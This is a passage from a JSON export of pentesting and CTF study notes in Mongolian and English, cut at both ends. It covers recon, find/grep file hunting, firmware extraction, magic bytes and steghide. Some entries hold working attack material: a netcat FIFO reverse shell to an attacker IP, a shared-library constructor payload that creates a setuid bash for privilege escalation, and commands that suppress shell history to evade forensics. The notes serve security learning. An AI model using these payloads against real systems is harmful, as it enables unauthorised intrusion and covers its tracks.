examples:\n\n```\nstrcmp\nstrncmp\nprintf\n```\n\n### Extract strings\n\n```\nstrings -n 6 [BINARY]\n```\n\n> 🧠 **RE workflow:**  \n> **Disassemble → Locate → Trace → Read strings**\n\n---\n\n# 📦 SECTION 5 — FIRMWARE & EMBEDDED REVERSE ENGINEERING\n\n## 5.1 🔎 Extraction with binwalk\n\nScan magic signatures:\n\n```\nbinwalk [FIRMWARE.img]\n```\n\nExtract hidden filesystems / kernels:\n\n```\nbinwalk -e [FIRMWARE.img]\n```\n\n> 🧠 **binwalk = “Find the hidden layers.”**\n\n---\n\n# 5.2 🧱 Mounting JFFS2 Filesystems\n\nCreate block device:\n\n```\nsudo mknod /dev/mtdblock0 b 31 0\n```\n\nLoad modules:\n\n```\nsudo modprobe jffs2 mtdram mtdblock\n```\n\nWrite flash data:\n\n```\nsudo dd if=filesystem.jffs2 of=/dev/mtdblock0\n```\n\nMount:\n\n```\nsudo mount -t jffs2 /dev/mtdblock0 /mnt/jffs2_file/\n```\n\n---\n\n# 5.3 🎯 High-Value Firmware Targets\n\n|Path|What to remember|\n|---|---|\n|`/etc/shadow` / `/etc/passwd`|🔑 Hardcoded credentials|\n|`/www` or `/htdocs`|🌐 Administrative web-panel source|\n|`/etc/system_defaults`|🏭 Factory-reset credentials / hidden AP keys|\n\n> 🧠 **Firmware memory hook: “Secrets → Web → Defaults.”**\n\n---\n\n# 🧠 ONE-PAGE MEMORY WALL\n\n## 🛰️ Recon\n\n```\nWHOIS → DNS → CRT → SHODAN/CENSYS\n```\n\n## 📡 Active\n\n```\nPING → TRACE → BANNER → NMAP\n```\n\n## 🚪 Services\n\n```\n21 FTP\n22 SSH\n23 Telnet\n25 SMTP\n139/445 SMB\n2049/111 NFS\n3306 MySQL\n```\n\n## ⬆️ Priv Esc\n\n```\nSUDO\n ↓\nSUID / CAPS\n ↓\nCRON\n ↓\nFILES / CREDS\n ↓\nPATH\n ↓\n.SO\n ↓\nHISTORY\n ↓\nKERNEL\n```\n\n## 🔬 Assembly\n\n```\nRIP = GPS\nRAX = Return\nRAX > EAX > AX > AL\nRCX → RDX → R8 → R9 → Stack\nMOV = Copy\nLEA = Address\nXOR = Zero\nCMP = Compare\nJCC = Branch\nNOP = Nothing\n```\n\n## 📦 Firmware\n\n```\nBINWALK\n  ↓\nEXTRACT\n  ↓\nMOUNT\n  ↓\nCHECK /etc\n  ↓\nCHECK WEB FILES\n  ↓\nCHECK DEFAULTS\n```\n\n---\n\n# 🧪 ACTIVE RECALL — CLOSE THE NOTE\n\nAnswer these from memory before revealing the answers.\n\n### 🛰️ Recon\n\n**Q:** What are the four passive recon buckets?\n\n<details> <summary>Answer</summary>\n\nWHOIS/RDAP → DNS → Certificate Transparency → Shodan/Censys\n\n</details>\n\n**Q:** What record should make you think “dangling alias”?\n\n<details> <summary>Answer</summary>\n\nCNAME\n\n</details>\n\n---\n\n### 🚪 Services\n\n**Q:** FTP?\n\n<details><summary>Answer</summary>`21`</details>\n\n**Q:** SSH?\n\n<details><summary>Answer</summary>`22`</details>\n\n**Q:** SMB?\n\n<details><summary>Answer</summary>`139 / 445`</details>\n\n**Q:** MySQL?\n\n<details><summary>Answer</summary>`3306`</details>\n\n---\n\n### ⬆️ Priv Esc\n\n**Q:** What do you check first?\n\n<details><summary>Answer</summary>\n\n`sudo -l`\n\n</details>\n\n**Q:** What bit is the classic SUID bit?\n\n<details><summary>Answer</summary>\n\nOctal `4000`\n\n</details>\n\n**Q:** What command discovers capabilities?\n\n<details><summary>Answer</summary>\n\n`getcap -r / 2>/dev/null`\n\n</details>\n\n**Q:** What is the “last resort”?\n\n<details><summary>Answer</summary>\n\nKernel exploits\n\n</details>\n\n---\n\n### 🔬 Assembly\n\n**Q:** Which register is the instruction pointer?\n\n<details><summary>Answer</summary>\n\nRIP\n\n</details>\n\n**Q:** Which register stores function return values?\n\n<details><summary>Answer</summary>\n\nRAX\n\n</details>\n\n**Q:** Calling convention order?\n\n<details><summary>Answer</summary>\n\nRCX → RDX → R8 → R9 → Stack\n\n</details>\n\n**Q:** Little-endian means?\n\n<details><summary>Answer</summary>\n\nLeast significant byte first\n\n</details>\n\n---\n\n# 🧠 10-SECOND REVIEW\n\n> **Recon finds the map.**  \n> **Scanning finds the doors.**  \n> **Services reveal the entry points.**  \n> **Privilege escalation finds the ladder.**  \n> **Reverse engineering explains the machine.**  \n> **Firmware hides the extra layers.**\n\n### 🔖 Tags\n\n`#cybersecurity` `#pentesting` `#recon` `#networking` `#linux` `#privesc` `#assembly` `#reverse-engineering` `#firmware` `#obsidian`",
    "sourcePath": "cheater/cheatshit.md"
  },
  {
    "id": 10009,
    "title": "finding",
    "room": "KS",
    "source": "Cyber",
    "stage": "Pro Arena",
    "tags": [
      "ks-import",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "6 min",
    "date": "KS import",
    "excerpt": "KS source: finding.md",
    "content": "# 🕵️ LINUX FILE HUNTING\n\n## 🗺️ Эхлээд том зураг\n\n```\n                 🏠 LINUX\n                    │\n       ┌────────────┼────────────┐\n       ▼            ▼            ▼\n   🔎 fFIND       🧠 GREP      🔑 PERMISSIONS\n       │            │            │\n   \"ХААНА?\"      \"ДОТОР ЮУ?\"   \"ХЭН ЧАДАХ?\"\n       │            │            │\n       └────────────┼────────────┘\n                    ▼\n                 ⏰ TIME\n                    │\n                    ▼\n                ⚙️ PROCESSES\n                    │\n                    ▼\n                🤖 CRON\n```\n\nЭнэ note-ийн хамгийн чухал ялгаа:\n\n> **`find` = “WHERE?”**  \n> **`grep` = “WHAT INSIDE?”**\n\nЭнэ хоёрыг андуурахгүй байхад ихэнх нь амархан болдог.\n\n---\n\n# 🎬 1. `find` — “Файл хаана байна?”\n\n## 🎯 Яг нэрээр нь хайх\n\n```\nfind / -name \"root.txt\" 2>/dev/null\n```\n\nЭнэ нь:\n\n> **“Бүх filesystem-ээс яг `root.txt` гэдэг файл хаана байна?”**\n\nгэсэн асуулт.\n\nMental picture:\n\n```\n🏠 /\n├── home/\n├── etc/\n├── var/\n├── opt/\n└── ...\n      ↓\n🔎 \"root.txt байна уу?\"\n```\n\n---\n\n## 🧩 `user.txt`\n\n```\nfind / -name \"user.txt\" 2>/dev/null\n```\n\nCTF орчинд ийм нэртэй flag файл таарах тохиолдол элбэг.\n\nТэгэхээр:\n\n> **`-name` = “Нэрээр нь хай.”**\n\n---\n\n# 🔤 `-iname` — Том жижиг үсэг хамаарахгүй\n\n```\nfind / -iname \"*flag*\" 2>/dev/null\n```\n\nЭнэ:\n\n```\nflag\nFLAG\nFlag\nmyflag.txt\nFLAG_backup\n```\n\nгэх мэт match хийж чадна.\n\n### 🧠 Memory\n\n> `-name` = exact case-sensitive pattern  \n> `-iname` = ignore case\n\n---\n\n# 🧰 Extension-оор хайх\n\n```\nfind /home /var /opt -name \"*.txt\" 2>/dev/null\n```\n\nЭнэ:\n\n> **“Эдгээр directory-үүд доторх `.txt` файлуудыг өг.”**\n\nЖишээ:\n\n```\n/home/a.txt\n/home/notes.txt\n/var/log.txt\n/opt/backup.txt\n```\n\n---\n\n# 🗃️ Backup hunting\n\n```\nfind / -name \"*.bak\" -o -name \"*.old\" -o -name \"*.backup\" 2>/dev/null\n```\n\nЭнд:\n\n```\n.bak\n.old\n.backup\n```\n\nгэдэг нь:\n\n> **“Хуучин/backup файл байж болох зүйлс.”**\n\nгэж бодно.\n\n### 🧠 Memory\n\n> **Backup = “Хүмүүс хуучин нууцаа мартсан байж магадгүй.”**\n\n---\n\n# 🕳️ `2>/dev/null` — Яагаад байнга харагддаг вэ?\n\nЭнэ бол маш хэрэгтэй Linux concept.\n\nЖишээ:\n\n```\nfind / -name \"*.txt\"\n```\n\nгээд ажиллуулахад:\n\n```\nfind: '/root': Permission denied\nfind: '/proc/...': Permission denied\n...\n```\n\nгээд олон error гарна.\n\nТэгээд:\n\n```\n2>/dev/null\n```\n\nгэж залгахад:\n\n```\nstderr\n  ↓\n/dev/null\n  ↓\n🗑️ discard\n```\n\nболно.\n\n### 🧠 Memory image\n\n```\nProgram\n ├── stdout → 👀 дэлгэц\n └── stderr → 🗑️ /dev/null\n```\n\nТэгэхээр:\n\n> **`2>/dev/null` = “алдаа/permission noise-ийг хогийн сав руу хий.”**\n\nЭнэ нь permission-ийг тойрч байгаа биш, **зүгээр л error output-ийг нууж байгаа**.\n\n---\n\n# 🎬 2. `grep` — “Файлын дотор юу байна?”\n\nОдоо ялгааг хараарай.\n\n`find`:\n\n> 📍 **файлыг олно**\n\n`grep`:\n\n> 🧠 **файлын доторх текстийг олно**\n\n---\n\n# 🔎 Recursive search\n\n```\ngrep -rn \"THM{\" /root /home /var /opt 2>/dev/null\n```\n\nҮүнийг:\n\n> **“Эдгээр directory-үүдийн бүх файлуудын дотроос `THM{` гэсэн текст хаана байна?”**\n\nгэж ойлго.\n\n### Flag hunting mental model\n\n```\n/home\n ├── a.txt\n ├── notes\n └── app/\n       └── config.txt\n             ↓\n        grep \"THM{\"\n```\n\n---\n\n# 🧠 `grep -rn`\n\nЭнийг жижигхэн mnemonic болгоё:\n\n```\n-r = 🔁 Recursive\n-n = 🔢 line Number\n```\n\nТэгэхээр:\n\n> **R = roam through directories**  \n> **N = tell me the line**\n\n---\n\n# 🔤 `grep -rni`\n\n```\ngrep -rni \"password\" /var/www/ /opt/ 2>/dev/null\n```\n\nЭнд:\n\n```\n-r → recursive\n-n → line number\n-i → ignore case\n```\n\nТиймээс:\n\n> **“password гэдэг үгтэй төстэй ямар ч case бүхий мөрийг олоод line number-тай өг.”**\n\n---\n\n# 🎯 File type хязгаарлах\n\n```\ngrep -rn --include=\"*.php\" \"DB_PASSWORD\" /var/www/\n```\n\nЭнэ маш гоё concept.\n\nЧи:\n\n```\n/var/www\n```\n\nдоторх **бүх юм** биш,\n\nзөвхөн:\n\n```\n*.php\n```\n\nфайлуудад хайлт хийж байна.\n\nMental image:\n\n```\n/var/www\n ├── index.php     ✅ search\n ├── config.php    ✅ search\n ├── logo.png      ❌ skip\n └── style.css     ❌ skip\n```\n\n### 🧠 Memory\n\n> `--include` = **“Зөвхөн энэ төрлийн файлыг шалга.”**\n\n---\n\n# 📄 `grep -rl`\n\n```\ngrep -rl \"flag\" /home/ 2>/dev/null\n```\n\nЭнэ удаа line биш:\n\n> **“Match гарсан FILE NAME-уудыг л өг.”**\n\nMental image:\n\n```\na.txt       ❌\nnotes.txt   ✅\nconfig.php  ❌\nsecret.txt  ✅\n```\n\nOutput:\n\n```\nnotes.txt\nsecret.txt\n```\n\n### 🧠 Memory\n\n> `-l` = **location/file name**\n\n---\n\n# 🔥 FIND vs GREP\n\nЭнэ хоёрыг Obsidian дээр томоор бич:\n\n```\n🔎 FIND\n= WHERE IS THE FILE?\n\n🧠 GREP\n= WHAT IS INSIDE THE FILE?\n```\n\nЖишээ:\n\n```\nfind / -name \"*.conf\"\n        ↓\n📍 CONFIG хаана?\n\ngrep -r \"password\" /etc\n        ↓\n🔑 password дотор байна уу?\n```\n\n---\n\n# 🎬 3. Permissions & Ownership\n\nОдоо file оллоо.\n\nДараагийн асуулт:\n\n> **“Энэ файлыг хэн эзэмшдэг вэ?”**\n> \n> **“Хэн өөрчилж чаддаг вэ?”**\n\n---\n\n# 👑 SUID\n\n```\nfind / -perm -4000 -type f 2>/dev/null\n```\n\nэсвэл:\n\n```\nfind / -perm -u=s -type f 2>/dev/null\n```\n\nЭнэ нь:\n\n> **SUID executable-үүдийг хайж байна.**\n\nMental image:\n\n```\n👤 You\n   ↓\n⚙️ SUID program\n   ↓\n🪪 owner-ийн эрхийн context\n```\n\n### 🧠\n\n> `4000 = SUID clue`\n\n---\n\n# ✍️ World-writable FILE\n\n```\nfind / -type f -perm -o+w 2>/dev/null\n```\n\nЭнэ:\n\n> **“Бүгдэд write permission-тэй file байна уу?”**\n\n`o+w`:\n\n```\no = others\n+w = write\n```\n\nТэгэхээр:\n\n```\n-rw-rw-rw-\n```\n\nшиг зүйл сонирхогдоно.\n\nГэхдээ:\n\n> **World-writable = automatically exploitable**\n\nбиш.\n\nХарин:\n\n```\nWRITE\n+\nTRUSTED/PRIVILEGED USE\n```\n\nбайвал илүү чухал.\n\n---\n\n# 📂 World-writable DIRECTORY\n\n```\nfind / -type d -perm -o+w 2>/dev/null\n```\n\nЯлгаа:\n\n```\n-type f → 📄 file\n-type d → 📁 directory\n```\n\n---\n\n# 👥 Group writable\n\n```\nfind / -group cage -writable 2>/dev/null\n```\n\nЭнэ:\n\n> **“`cage` group-ийн эзэмшдэг, бас write хийж болох file байна уу?”**\n\nгэсэн асуулт.\n\n---\n\n# 👤 User-owned files\n\n```\nfind / -user weston 2>/dev/null\n```\n\nЭнэ:\n\n> **“weston user-ийн owner болсон бүх файлыг ол.”**\n\n---\n\n# 🧠 Ownership-ийг ингэж сана\n\n```\n📄 FILE\n ├── 👤 OWNER\n ├── 👥 GROUP\n └── 🌍 OTHERS\n```\n\nТэгээд permission:\n\n```\nREAD\nWRITE\nEXECUTE\n```\n\nгэж 3 талаас нь хар.\n\n---\n\n# 🎬 4. TIME MACHINE — “Хэзээ өөрчлөгдсөн?”\n\nЭнэ хэсгийг хүмүүс их мартдаг.\n\nГэхдээ маш сонирхолтой.\n\n---\n\n# ⏰ `-mmin -10`\n\n```\nfind / -mmin -10 -not -path \"/proc/*\" -not -path \"/sys/*\" 2>/dev/null\n```\n\nЭнэ:\n\n> **“Сүүлийн 10 минутын дотор modification болсон зүйлсийг ол.”**\n\nMental image:\n\n```\n⏰ 15:00\n      ↓\n15:10\n      ↓\n🔎 What changed recently?\n```\n\nЯагаад cron investigation-д хэрэгтэй байж болох вэ?\n\nХэрэв ямар нэг automated process тодорхой файл байнга өөрчилж байвал timestamp нь clue болж болно.\n\n---\n\n# 📅 `-mtime -1`\n\n```\nfind /etc /var /opt -mtime -1 2>/dev/null\n```\n\nЭнэ:\n\n> **“Сүүлийн 1 өдөрт modification болсон зүйлс.”**\n\n---\n\n# 🐘 Large files\n\n```\nfind / -type f -size +50M 2>/dev/null\n```\n\nЭнэ:\n\n> **“50 MB-аас том файлууд хаана байна?”**\n\nЯагаад хэрэгтэй байж болох вэ?\n\n```\n📦 VM image\n📦 database dump\n📦 backup\n📦 archive\n📦 log\n```\n\nгэх мэт том data байж болно.\n\nГэхдээ:\n\n> **Том = сонирхолтой**\n\nгэж шууд дүгнэхгүй. Энэ нь зүгээр discovery filter.\n\n---\n\n# 🕳️ Empty files\n\n```\nfind /var/log -type f -empty\n```\n\nЭнэ:\n\n> **“Хоосон log files байна уу?”**\n\nгэж хайна.\n\nЭнэ нь яг өөрөө privilege escalation technique биш; filesystem housekeeping/debugging зэрэгт ч хэрэгтэй.\n\n---\n\n# 🎬 5. PROCESSES + CRON\n\nОдоо file hunting-ээс:\n\n# ⚙️ “System яг одоо юу хийж байна?”\n\nрүү орно.\n\n---\n\n# ⏰ Cron\n\n```\ncat /etc/crontab\n```\n\nЭнэ:\n\n> **“System ямар automated schedule-уудтай вэ?”**\n\nгэсэн асуулт.\n\n```\nls -la /etc/cron.*\n```\n\nгэдэг нь:\n\n> **“Cron-related directories/configuration юу байна?”**\n\nгэж харна.\n\n---\n\n# 👤 User crontabs\n\n```\ncat /var/spool/cron/crontabs/* 2>/dev/null\n```\n\nЭнэ нь user-specific cron definitions байгаа эсэхийг харах зорилготой.\n\n---\n\n# 👀 Processes\n\n```\nps aux\n```\n\nҮүнийг:\n\n> 📹 **CCTV**\n\nгэж төсөөл.\n\n```\nPID\nUSER\nCOMMAND\n```\n\nзэрэг information харна.\n\n---\n\n# 🐍 Python process-ууд\n\n```\nps -ef | grep python\n```\n\nЭнэ:\n\n> **“Python-той холбоотой ажиллаж байгаа process байна уу?”**\n\nгэж filter хийж байна.\n\nMental image:\n\n```\n⚙️  process 1\n🐍 python\n⚙️  process 2\n⚙️  nginx\n🐍 python\n```\n\n---\n\n# 🧠 БҮХЭЛ НЬ НЭГ МӨРДЛӨГ\n\nЭнийг хамгийн сайн remember хийх аргаа үзье.\n\nЧи Linux house дотор орлоо:\n\n```\n🏠 LINUX\n   │\n   ▼\n🔎 FIND\n\"ЮУ ХААНА БАЙНА?\"\n   │\n   ▼\n🧠 GREP\n\"ДОТОР ЮУ БАЙНА?\"\n   │\n   ▼\n🔑 PERMISSIONS\n\"ХЭН УНШИЖ/БИЧИЖ ЧАДАХ ВЭ?\"\n   │\n   ▼\n👤 OWNERSHIP\n\"ХЭНИЙХ ВЭ?\"\n   │\n   ▼\n⏰ TIMESTAMPS\n\"ХЭЗЭЭ ӨӨРЧЛӨГДСӨН ВЭ?\"\n   │\n   ▼\n⚙️ PROCESSES\n\"ЮУ ОДОО АЖИЛЛАЖ БАЙНА?\"\n   │\n   ▼\n🤖 CRON\n\"ЮУ АВТОМАТААР АЖИЛЛАДАГ ВЭ?\"\n```\n\n---\n\n# 🧠 SUPER MEMORY WALL\n\n## 🔎 FIND\n\n```\n-name     → exact name/pattern\n-iname    → ignore case\n-type f   → files\n-type d   → directories\n```\n\n> **FIND = WHERE?**\n\n---\n\n## 🧠 GREP\n\n```\n-r     → recursive\n-n     → line number\n-i     → ignore case\n-l     → filenames only\n--include → certain file types\n```\n\n> **GREP = WHAT'S INSIDE?**\n\n---\n\n## 🔑 PERMISSIONS\n\n```\n4000   → SUID\n2000   → SGID\n\no+w    → others can write\n-user  → owned by user\n-group → owned by group\n```\n\n> **PERMISSIONS = WHO CAN TOUCH IT?**\n\n---\n\n## ⏰ TIME\n\n```\n-mmin -10\n→ last 10 minutes\n\n-mtime -1\n→ last 1 day\n```\n\n> **TIME = WHAT CHANGED RECENTLY?**\n\n---\n\n## ⚙️ PROCESS\n\n```\nps aux\nps -ef\n```\n\n> **PROCESS = WHAT IS ALIVE NOW?**\n\n---\n\n## 🤖 CRON\n\n```\n/etc/crontab\n/etc/cron.*\n/var/spool/cron/...\n```\n\n> **CRON = WHAT RUNS AUTOMATICALLY?**",
    "sourcePath": "finding.md"
  },
  {
    "id": 10010,
    "title": "gobuster",
    "room": "KS",
    "source": "Cyber",
    "stage": "Pro Arena",
    "tags": [
      "ks-import",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "1 min",
    "date": "KS import",
    "excerpt": "KS source: gobuster.md",
    "content": "gobuster dir -u http://10.48.154.222 \\\n-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \\\n-x php,html,js,txt,bak,old,zip \\\n-t 50 \n\nferoxbuster -u http://10.48.181.78 \\\n-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt ",
    "sourcePath": "gobuster.md"
  },
  {
    "id": 10011,
    "title": "Ignite",
    "room": "KS",
    "source": "Cyber",
    "stage": "Pro Arena",
    "tags": [
      "ks-import",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "1 min",
    "date": "KS import",
    "excerpt": "KS source: Ignite.md",
    "content": "📂 STREAMLINED OBSIDIAN VAULT ENTRY\n\nCopy this high-density reference card into your vault:\n\nTitle: Web Shell Mechanics - TTY Limitations & FIFO Reverse Shells\nTags: #Linux #WebExploit #ReverseShell #TTY #mkfifo #Netcat #ConfigHunting\n\n> ```\n>     ==**Web Shell Limitation: Shells spawned via web exploits (PHP system() / eval()) lack a ==/dev/tty== interface, causing interactive commands (su, sudo, passwd) to fail or hang.**==\n> ```\n> \n> ```\n>     Netcat Named Pipe (FIFO) Reverse Shell:\n> ```\n\n```\n        ==rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc [KALI_IP] [PORT] > /tmp/f==\n```\n\n        Plumbing: Connects Kali standard input to a local named pipe (/tmp/f), feeding /bin/sh and streaming output back across Netcat.\n\n    TTY Stabilization Protocol (Post-Connection):\n\n```\n        python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n```\n\n        ",
    "sourcePath": "Ignite.md"
  },
  {
    "id": 10012,
    "title": "cheatshit",
    "room": "Image exploit",
    "source": "Cyber",
    "stage": "Foundations",
    "tags": [
      "ks-import",
      "image-exploit",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "2 min",
    "date": "KS import",
    "excerpt": "KS source: Image exploit/cheatshit.md",
    "content": "# 🧬 MAGIC BYTES — ONE-PAGE CHEATSHEET\n\n> **Magic Bytes = File-ийн “хурууны хээ”**  \n> Extension-д битгий шууд итгэ. Эхний bytes-ийг шалга.\n\n---\n\n## 🚨 MUST KNOW SIGNATURES\n\n| 📦 File Type    | 🧬 Magic Bytes            | 👀 ASCII   |\n| --------------- | ------------------------- | ---------- |\n| 🖼️ **PNG**     | `89 50 4E 47 0D 0A 1A 0A` | `.PNG....` |\n| 📸 **JPEG/JPG** | `FF D8 FF`                | `...`      |\n| 🎞️ **GIF89a**  | `47 49 46 38 39 61`       | `GIF89a`   |\n| 🎞️ **GIF87a**  | `47 49 46 38 37 61`       | `GIF87a`   |\n| 📦 **ZIP**      | `50 4B 03 04`             | `PK..`     |\n| 📄 **PDF**      | `25 50 44 46`             | `%PDF`     |\n| 🐧 **ELF**      | `7F 45 4C 46`             | `.ELF`     |\n| 🪟 **PE/EXE**   | `4D 5A`                   | `MZ`       |\n\n### 🧠 Memory Hook\n\n```\nPNG  → 89 50 4E 47\nJPEG → FF D8 FF\nGIF  → GIF\nZIP  → PK\nPDF  → %PDF\nELF  → ELF\nEXE  → MZ\n```\n\n---\n\n# 🔬 CHECK THE FILE\n\n### 1️⃣ Identify\n\n```\nfile image.png\n```\n\n> 🕵️ **“Чи үнэхээр PNG мөн үү?”**\n\n---\n\n### 2️⃣ See Raw Bytes\n\n```\nxxd -l 32 image.png\n```\n\nэсвэл\n\n```\nhexdump -C -n 32 image.png\n```\n\n> 🔬 **“Надад эхний 32 bytes-ийг харуул.”**\n\n---\n\n### 3️⃣ Check PNG Structure\n\n```\npngcheck image.png\n```\n\n> 🩺 **“PNG structure эрүүл үү?”**\n\n---\n\n### 4️⃣ Search Hidden Layers\n\n```\nbinwalk image.png\n```\n\n> 📦 **“Дотор нь өөр file/data нуугдсан уу?”**\n\n---\n\n# 🧠 4 TOOLS = 4 QUESTIONS\n\n```\nfile\n ↓\n❓ WHAT IS IT?\n\nxxd\n ↓\n❓ WHAT ARE THE RAW BYTES?\n\npngcheck\n ↓\n❓ IS THE STRUCTURE VALID?\n\nbinwalk\n ↓\n❓ IS SOMETHING ELSE INSIDE?\n```\n\n---\n\n# 💥 CORRUPTED HEADER\n\n### Normal PNG\n\n```\n89 50 4E 47 0D 0A 1A 0A\n```\n\n### Suspicious\n\n```\n00 00 00 00 00 00 00 00\n```\n\nMental model:\n\n```\n🏷️ Extension\n   ↓\n\"I am PNG!\"\n\n🔬 Magic bytes\n   ↓\n\"Prove it.\"\n\n❌ Wrong signature\n   ↓\nHeader may be corrupted\n```\n\n---\n\n# 🛠️ REPAIR IDEA — PNG\n\nCorrect signature:\n\n```\n89 50 4E 47 0D 0A 1A 0A\n```\n\nPython:\n\n```\nwith open(\"bad.png\", \"rb\") as f:\n    data = bytearray(f.read())\n\ndata[:8] = bytes([\n    0x89, 0x50, 0x4E, 0x47,\n    0x0D, 0x0A, 0x1A, 0x0A\n])\n\nwith open(\"fixed.png\", \"wb\") as f:\n    f.write(data)\n```\n\n### ⚠️ Remember\n\n> **Зөвхөн header засагдлаа гээд бүх file бүтэн гэсэн үг биш.**\n\nТиймээс:\n\n```\nREPAIR\n  ↓\nfile\n  ↓\npngcheck\n  ↓\nOPEN\n```\n\n---\n\n# 🧠 FINAL MEMORY WALL\n\n```\n       📦 FILE\n          │\n          ▼\n   🏷️ Extension\n   \"I say I'm PNG\"\n          │\n          ▼\n   🧬 MAGIC BYTES\n   \"Prove your identity.\"\n          │\n          ▼\n      🔬 XXD\n   \"Show raw bytes.\"\n          │\n          ▼\n    🩺 PNGCHECK\n   \"Is structure valid?\"\n          │\n          ▼\n     📦 BINWALK\n   \"Anything hidden?\"\n```\n\n## 🎯 ONE-LINE MEMORY\n\n> **Extension = нэр → Magic Bytes = identity → `xxd` = raw truth → `pngcheck` = health check → `binwalk` = hidden layers**\n> ```\n>  After fixing the file:\n>   \n>     # 1. Verify the file command recognizes it:\n```\n>     file fixed.png\n```\n>   \n>     # 2. View the image:\n```\n>     eog fixed.png     # GNOME Image Viewer\n```\n>     # or\n```\n>     feh fixed.png\n```\n>     # or\n```\n>     xdg-open fixed.png\n```\n>   \n> ```\n",
    "sourcePath": "Image exploit/cheatshit.md"
  },
  {
    "id": 10013,
    "title": "commands",
    "room": "Image exploit",
    "source": "Cyber",
    "stage": "Foundations",
    "tags": [
      "ks-import",
      "image-exploit",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "1 min",
    "date": "KS import",
    "excerpt": "KS source: Image exploit/commands.md",
    "content": "# `exiftool -a -u`\n\n```\nexiftool -a -u aa.jpg\n```\n\nЭнд:\n\n```\n-a → duplicate tags-ийг бас харуул\n-u → unknown tags-ийг бас харуул\n```\n\nТэгэхээр:\n\n> **“Энгийн metadata-гээс гадна давхардсан болон tool танихгүй tag-уудыг ч харуул.”**\n\nгэсэн санаа.\n\n---\n\n# 🎯 `grep`\n\n```\nexiftool aa.jpg | grep -iE \"comment|artist|description\"\n```\n\nЭнэ бол:\n\n```\nexiftool\n   ↓\nбүх metadata\n   ↓\ngrep\n   ↓\nзөвхөн:\ncomment\nartist\ndescription\n```\n\nгэж шүүж байна.\n\n`-i` = case-insensitive.\n\nТэгэхээр:\n\n```\nComment\ncomment\nCOMMENT\n```\n\nбүгд таарна.\n\n`-E` = extended regular expression.\n\n\n",
    "sourcePath": "Image exploit/commands.md"
  },
  {
    "id": 10014,
    "title": "commands2",
    "room": "Image exploit",
    "source": "Cyber",
    "stage": "Foundations",
    "tags": [
      "ks-import",
      "image-exploit",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "1 min",
    "date": "KS import",
    "excerpt": "KS source: Image exploit/commands2.md",
    "content": "# 🔍 `steghide info`\n\n```\nsteghide info image.jpg\n```\n\nЭнэ:\n\n> **“Энэ image file-д steghide ашиглан нуусан data байгаа юу?”**\n\nгэж шалгаж байна.\n\n---\n\n# 📤 `steghide extract`\n\n```\nsteghide extract -sf image.jpg\n```\n\nЭнд:\n\n```\n-sf = stegofile\n```\n\nөөрөөр хэлбэл:\n\n> **“Энэ бол hidden data агуулж болох source image.”**\n\nТэгээд tool password/passphrase асууж болно.\n\n---\n\n# 🔑 `-p`\n\n```\nsteghide extract -sf image.jpg -p \"keyword\"\n```\n\n`-p`:\n\n> **“Passphrase ийм байна.”**",
    "sourcePath": "Image exploit/commands2.md"
  },
  {
    "id": 10015,
    "title": "linux prev 3",
    "room": "linux prev fundd",
    "source": "Cyber",
    "stage": "Foundations",
    "tags": [
      "ks-import",
      "linux-prev-fundd",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "1 min",
    "date": "KS import",
    "excerpt": "KS source: linux prev fundd/linux prev 3.md",
    "content": "📂 STREAMLINED OBSIDIAN VAULT ENTRY\n\nCopy this high-density reference card into your vault:\n\nTitle: Linux PrivEsc - SUID Shared Object (.so) Hijacking\nTags: #Linux #PrivEsc #SUID #SharedObject #Strace #GCC #RPATH\n> \n> ```\n>     Core Vulnerability: An SUID root binary attempts to load a shared library (.so) from a user-writable directory (due to misconfigured RPATH/RUNPATH) or tries to load a non-existent library.\n> ```\n\n    Discovery (Tracing Syscalls):\n\n```\n        strace [SUID_BINARY] 2>&1 | grep -iE \"open|access|no such file\"\n```\n\n        Look for failed openat() attempts in writable directories (/tmp, /home/*, /var/tmp).\n\n> ```\n>     Payload Construction (lib.c):\n>     code C\n> ```\n\n```\n#include <stdio.h>\n#include <stdlib.h>\nstatic void inject() __attribute__((constructor));\nvoid inject() {\n    system(\"cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p\");\n}\n\nCompilation: ==gcc -shared -fPIC -o /path/to/missing/lib.so lib.c==\n\n> ```\n```\n==**8. Save the file as libcalc.c==**\n**==9. In command prompt type:==**\n**==gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c==**\n**==10. In command prompt type: /usr/local/bin/suid-so==**\n**==11. In command prompt type: id**==\n```",
    "sourcePath": "linux prev fundd/linux prev 3.md"
  },
  {
    "id": 10016,
    "title": "linux prev fund",
    "room": "linux prev fundd",
    "source": "Cyber",
    "stage": "Foundations",
    "tags": [
      "ks-import",
      "linux-prev-fundd",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "1 min",
    "date": "KS import",
    "excerpt": "KS source: linux prev fundd/linux prev fund.md",
    "content": "📂 STREAMLINED OBSIDIAN VAULT ENTRY\n\nCopy this high-density reference card into your vault:\n\nTitle: Linux PrivEsc - Shell History & Credential Spills\nTags: #Linux #PrivEsc #Credentials #BashHistory #PostExploitation #AntiForensics\n\n> ```\n>     Vulnerability Mechanism: Command history flushes from RAM buffer (HISTSIZE) to disk (~/.bash_history / HISTFILESIZE) upon session termination.\n> \n>     Key Audit Files:\n> ```\n\n```\n        ==cat ~/.bash_history==\n\n        ==cat /root/.bash_history== (If readable)\n\n        ==cat /home/*/.bash_history==\n\n```\n    High-Value Search Filter:\n\n```\n        grep -iE \"passw|user|admin|ssh|mysql|key|token\" ~/.bash_history\n```\n\n> ```\n>     Operator Anti-Forensics (Preventing History Logging):\n> \n>         Leading space before command: [command] (Requires HISTCONTROL=ignorespace).\n> \n>         Session-wide suppression: ==unset HISTFILE && export HISTSIZE=0==.\n> ```",
    "sourcePath": "linux prev fundd/linux prev fund.md"
  },
  {
    "id": 10017,
    "title": "linux prev",
    "room": "linux prev fundd",
    "source": "Cyber",
    "stage": "Foundations",
    "tags": [
      "ks-import",
      "linux-prev-fundd",
      "field-reference"
    ],
